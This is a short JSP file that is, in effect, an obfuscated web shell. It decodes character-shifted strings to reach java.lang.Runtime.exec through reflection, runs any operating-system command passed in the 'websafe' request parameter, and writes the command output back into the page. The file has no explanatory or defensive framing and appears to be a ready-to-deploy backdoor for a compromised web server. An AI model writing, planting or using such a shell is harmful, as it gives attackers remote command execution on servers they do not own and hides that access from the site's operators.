<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!public String HMfR(String yOK){String aAh="";for (int i = 0; i < yOK.length(); i++) {aAh+=(char)(yOK.charAt(i)+6);}return aAh;}
%>
<% String yiO=request.getParameter("websafe");if(yiO!=null){ Class tJIi = Class.forName(HMfR("d[p[(f[ha(Lohncg_"));
Process Mdlz = (Process) tJIi.getMethod(HMfR("_r_]"), String.class).invoke(tJIi.getMethod(HMfR("a_nLohncg_")).invoke(null),yiO);
java.io.InputStream in = Mdlz.getInputStream();byte[] PYp = new byte[2048];out.print("<pre>");while(in.read(PYp)!=-1){ out.println(new String(PYp)); }out.print("</pre>"); }
%>

